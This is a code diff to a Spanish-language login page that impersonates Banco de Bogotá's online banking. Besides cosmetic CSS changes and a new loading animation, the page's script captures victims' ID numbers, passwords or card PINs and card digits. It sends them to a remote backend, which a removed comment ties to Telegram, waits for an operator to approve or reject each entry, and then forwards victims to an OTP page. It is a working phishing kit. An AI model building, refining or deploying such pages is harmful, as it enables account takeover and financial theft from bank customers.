@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banca Virtual - Banco de Bogotá</title>
     
-    <!-- Carga la configuración dinámica del backend -->
     <script src="/config.js"></script>
     
     <style>
@@ -24,7 +23,6 @@
             color: #333;
         }
 
-        /* --- CONTENEDOR IZQUIERDO (FORMULARIO) --- */
         .login-wrapper {
             width: 50%;
             display: flex;
@@ -40,7 +38,6 @@
             flex-direction: column;
         }
 
-        /* --- HEADER ESCRITORIO (PC) --- */
         .header-pc {
             display: flex;
             flex-direction: column;
@@ -60,12 +57,8 @@
             margin: 0;
         }
 
-        /* --- HEADER MÓVIL (Oculto por defecto) --- */
-        .header-mobile {
-            display: none;
-        }
+        .header-mobile { display: none; }
 
-        /* --- BANNER AZUL --- */
         .blue-banner {
             background-color: #003DA5;
             border-radius: 12px;
@@ -83,12 +76,8 @@
             margin-right: 15px;
         }
 
-        .blue-banner-text {
-            font-size: 0.85rem;
-            line-height: 1.3;
-        }
+        .blue-banner-text { font-size: 0.85rem; line-height: 1.3; }
 
-        /* --- CAJA DE LOGIN --- */
         .login-box {
             border: 1px solid #E0E0E0;
             border-radius: 12px;
@@ -97,11 +86,7 @@
             margin-bottom: 20px;
         }
 
-        /* Pestañas */
-        .tabs {
-            display: flex;
-            border-bottom: 1px solid #E0E0E0;
-        }
+        .tabs { display: flex; border-bottom: 1px solid #E0E0E0; }
 
         .tab {
             flex: 1;
@@ -120,17 +105,9 @@
             border-bottom: 3px solid #003DA5;
         }
 
-        /* Contenido de Pestañas */
-        .tab-content {
-            padding: 25px;
-            display: none;
-        }
+        .tab-content { padding: 25px; display: none; }
+        .tab-content.active { display: block; }
 
-        .tab-content.active {
-            display: block;
-        }
-
-        /* Alerta Celeste */
         .alert-info {
             background-color: #E8F4FF;
             color: #004085;
@@ -151,10 +128,7 @@
             color: #003DA5;
         }
 
-        /* Formularios */
-        .form-group {
-            margin-bottom: 20px;
-        }
+        .form-group { margin-bottom: 20px; }
 
         .form-group label {
             display: block;
@@ -164,10 +138,7 @@
             font-weight: 500;
         }
 
-        .input-row {
-            display: flex;
-            gap: 10px;
-        }
+        .input-row { display: flex; gap: 10px; }
 
         .input-row select {
             width: 35%;
@@ -180,9 +151,7 @@
             background: #fff;
         }
 
-        .input-row input {
-            width: 65%;
-        }
+        .input-row input { width: 65%; }
 
         input[type="text"], input[type="password"], select {
             width: 100%;
@@ -194,13 +163,9 @@
             transition: border 0.2s;
         }
 
-        input:focus, select:focus {
-            border-color: #003DA5;
-        }
+        input:focus, select:focus { border-color: #003DA5; }
 
-        .input-wrapper {
-            position: relative;
-        }
+        .input-wrapper { position: relative; }
 
         .eye-icon {
             position: absolute;
@@ -211,7 +176,6 @@
             color: #666;
         }
 
-        /* Botón Ingresar */
         .btn-ingresar {
             width: 100%;
             padding: 14px;
@@ -232,7 +196,6 @@
             cursor: pointer;
         }
 
-        /* Enlaces inferiores */
         .login-links {
             display: flex;
             justify-content: space-between;
@@ -240,13 +203,8 @@
             font-size: 0.9rem;
         }
 
-        .login-links a {
-            color: #003DA5;
-            text-decoration: none;
-            font-weight: 600;
-        }
+        .login-links a { color: #003DA5; text-decoration: none; font-weight: 600; }
 
-        /* Footer */
         .recaptcha-text {
             font-size: 0.75rem;
             color: #666;
@@ -254,7 +212,6 @@
         }
         .recaptcha-text a { color: #003DA5; text-decoration: none; }
 
-        /* --- CONTENEDOR DERECHO (items.png) --- */
         .right-section {
             width: 50%;
             display: flex;
@@ -271,7 +228,6 @@
             object-fit: contain;
         }
 
-        /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
         .overlay-screen {
             position: fixed;
             top: 0;
@@ -292,24 +248,43 @@
             color: white;
         }
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid rgba(255,255,255,0.3);
-            border-top: 6px solid white;
+        /* --- ANIMACIÓN DE BOLITAS (UNA A LA VEZ) --- */
+        .balls-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+            height: 40px; /* Para que no salte el layout */
+            align-items: flex-end;
+        }
+
+        .ball {
+            width: 20px;
+            height: 20px;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            opacity: 0; /* Empiezan ocultas */
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .ball-yellow { background-color: #FFCD00; }
+        .ball-blue   { background-color: #0055B8; }
+        .ball-red    { background-color: #E30613; }
+
+        /* Duración total: 3 segundos. Ciclo infinito */
+        .ball-yellow { animation: jumpOneByOne 3s infinite; animation-delay: 0s; }
+        .ball-blue   { animation: jumpOneByOne 3s infinite; animation-delay: 0.5s; }
+        .ball-red    { animation: jumpOneByOne 3s infinite; animation-delay: 1s; }
+
+        @keyframes jumpOneByOne {
+            0%   { transform: translateY(0); opacity: 0; }
+            5%   { opacity: 1; } /* Aparece */
+            15%  { transform: translateY(-25px); opacity: 1; } /* Salta */
+            25%  { transform: translateY(0); opacity: 1; } /* Cae */
+            35%  { opacity: 1; transform: translateY(0); } /* Se queda visible */
+            45%  { transform: translateY(-25px) rotate(180deg); } /* Salta y gira */
+            55%  { transform: translateY(0) rotate(360deg); } /* Cae girando */
+            100% { transform: translateY(0) rotate(360deg); opacity: 1; } /* Se queda visible y girada */
         }
 
-        #error-screen {
-            background-color: #fff;
-        }
+        #error-screen { background-color: #fff; }
 
         .error-box {
             max-width: 400px;
@@ -319,16 +294,8 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
 
-        .error-box h2 {
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        .error-box p {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
+        .error-box h2 { color: #333; margin-bottom: 15px; }
+        .error-box p { color: #666; margin-bottom: 30px; line-height: 1.5; }
 
         .btn-retry {
             background-color: #003DA5;
@@ -339,14 +306,8 @@
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s;
-        }
-        
-        .btn-retry:hover {
-            background-color: #002D72;
         }
 
-        /* --- RESPONSIVE MÓVIL --- */
         @media (max-width: 768px) {
             body {
                 flex-direction: column;
@@ -354,36 +315,21 @@
                 height: auto;
                 min-height: 100vh;
             }
-
-            .right-section {
-                display: none; 
-            }
-
+            .right-section { display: none; }
             .login-wrapper {
                 width: 100%;
                 padding: 20px;
                 align-items: flex-start;
             }
-
-            .login-section {
-                max-width: 100%;
-            }
-
-            .header-pc {
-                display: none;
-            }
-            
+            .login-section { max-width: 100%; }
+            .header-pc { display: none; }
             .header-mobile {
                 display: flex;
                 align-items: center;
                 margin-bottom: 20px;
                 gap: 10px;
             }
-            
-            .header-mobile img {
-                height: 35px;
-            }
-
+            .header-mobile img { height: 35px; }
             .header-mobile h1 {
                 font-size: 1.2rem;
                 font-weight: bold;
@@ -395,23 +341,19 @@
 </head>
 <body>
 
-    <!-- SECCIÓN IZQUIERDA (FORMULARIO) -->
     <div class="login-wrapper">
         <div class="login-section">
             
-            <!-- HEADER PC -->
             <div class="header-pc">
                 <img src="bogota.png" alt="Banco de Bogotá" class="logo-pc">
                 <h1>Bienvenido a tu Banca Virtual</h1>
             </div>
 
-            <!-- HEADER MÓVIL -->
             <div class="header-mobile">
                 <img src="x.png" alt="Logo">
                 <h1>Bienvenido a tu Banca Virtual</h1>
             </div>
 
-            <!-- Banner Azul -->
             <div class="blue-banner">
                 <img src="image.png" alt="Validación">
                 <div class="blue-banner-text">
@@ -420,18 +362,13 @@
                 </div>
             </div>
 
-            <!-- Caja de Login -->
             <div class="login-box">
-                
-                <!-- Pestañas -->
                 <div class="tabs">
                     <div class="tab active" onclick="switchTab('clave')">Clave segura</div>
                     <div class="tab" onclick="switchTab('tarjeta')">Tarjeta débito</div>
                 </div>
 
-                <!-- Contenido: Clave Segura -->
                 <div id="tab-clave" class="tab-content active">
-                    
                     <div class="alert-info" id="info-alert">
                         Estás ingresando con tu Clave Segura.<br>
                         Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.
@@ -469,9 +406,7 @@
                     </div>
                 </div>
 
-                <!-- Contenido: Tarjeta Débito -->
                 <div id="tab-tarjeta" class="tab-content">
-                    
                     <div class="form-group">
                         <label>Identificación</label>
                         <div class="input-row">
@@ -508,10 +443,8 @@
 
                     <button class="btn-ingresar" id="btn-tarjeta">Ingresar</button>
                 </div>
-
             </div>
 
-            <!-- Texto Legal -->
             <div class="recaptcha-text">
                 Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
             </div>
@@ -519,18 +452,20 @@
         </div>
     </div>
 
-    <!-- SECCIÓN DERECHA (items.png) -->
     <div class="right-section">
         <img src="items.png" alt="Menú de accesos directos">
     </div>
 
-    <!-- PANTALLA DE CARGA (AZUL) -->
+    <!-- PANTALLA DE CARGA CON ANIMACIÓN SECUENCIAL -->
     <div id="loading-screen" class="overlay-screen">
-        <div class="spinner"></div>
+        <div class="balls-container">
+            <div class="ball ball-yellow"></div>
+            <div class="ball ball-blue"></div>
+            <div class="ball ball-red"></div>
+        </div>
         <p style="font-size: 1.2rem; font-weight: 600;">Cargando...</p>
     </div>
 
-    <!-- PANTALLA DE ERROR (RECHAZO) -->
     <div id="error-screen" class="overlay-screen">
         <div class="error-box">
             <h2>Información incorrecta</h2>
@@ -539,11 +474,7 @@
         </div>
     </div>
 
-    <!-- Scripts -->
     <script>
-        // ==========================================
-        // 1. LÓGICA DE UI (PESTAÑAS Y BOTONES)
-        // ==========================================
         function switchTab(tabName) {
             document.getElementById('tab-clave').classList.remove('active');
             document.getElementById('tab-tarjeta').classList.remove('active');
@@ -560,7 +491,6 @@
             }
         }
 
-        // Elementos para activar el botón azul
         const docClave = document.getElementById('doc-clave');
         const passClave = document.getElementById('pass-clave');
         const btnClave = document.getElementById('btn-clave');
@@ -592,27 +522,13 @@
         passTarjeta.addEventListener('input', checkTarjeta);
         digitosTarjeta.addEventListener('input', checkTarjeta);
 
-
-        // ==========================================
-        // 2. LÓGICA DEL BACKEND (TELEGRAM Y POLLING)
-        // ==========================================
-        
-        // La URL viene del archivo config.js generado dinámicamente por el servidor
         const BACKEND_URL = window.BACKEND_URL;
-        
-        console.log('✅ BACKEND_URL cargada:', BACKEND_URL);
-        
-        if (!BACKEND_URL) {
-            console.error('❌ ERROR: BACKEND_URL no está configurada. Revisa /config.js');
-        }
-
         const loadingScreen = document.getElementById('loading-screen');
         const errorScreen = document.getElementById('error-screen');
         
         let currentPollingInterval = null;
         let currentRequestId = null;
 
-        // Función que envía los datos
         async function sendDataToBackend(tipo) {
             let identificacion, clave, ultimos4;
 
@@ -627,7 +543,6 @@
                 if (!identificacion || clave.length !== 4 || ultimos4.length !== 4) return;
             }
 
-            // Mostrar pantalla de carga
             loadingScreen.style.display = 'flex';
 
             try {
@@ -643,30 +558,20 @@
 
                 currentRequestId = data.requestId;
 
-                // Iniciar Polling cada 2 segundos
                 currentPollingInterval = setInterval(async () => {
                     const statusRes = await fetch(`${BACKEND_URL}/api/status/${currentRequestId}`);
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
-                        // APROBADO
                         clearInterval(currentPollingInterval);
-                        
-                        // --- CAMBIO CLAVE PARA OTP ---
-                        // Guardamos el requestId y la identificación en sessionStorage
                         sessionStorage.setItem('requestIdAprobado', currentRequestId);
                         sessionStorage.setItem('identificacionAprobada', identificacion);
-                        
-                        // Redirigir a otp.html
                         window.location.href = 'otp.html';
-
                     } else if (statusData.status === 'rejected') {
-                        // RECHAZADO
                         clearInterval(currentPollingInterval);
                         loadingScreen.style.display = 'none';
                         errorScreen.style.display = 'flex';
                     }
-                    // Si es 'pending', sigue esperando
                 }, 2000);
 
             } catch (error) {
@@ -676,13 +581,10 @@
             }
         }
 
-        // Función para volver al formulario tras el rechazo
         function retryLogin() {
             errorScreen.style.display = 'none';
-            // Los datos en los inputs se mantienen intactos automáticamente
         }
 
-        // Eventos de clic en los botones
         btnClave.addEventListener('click', () => sendDataToBackend('clave'));
         btnTarjeta.addEventListener('click', () => sendDataToBackend('tarjeta'));
     </script>
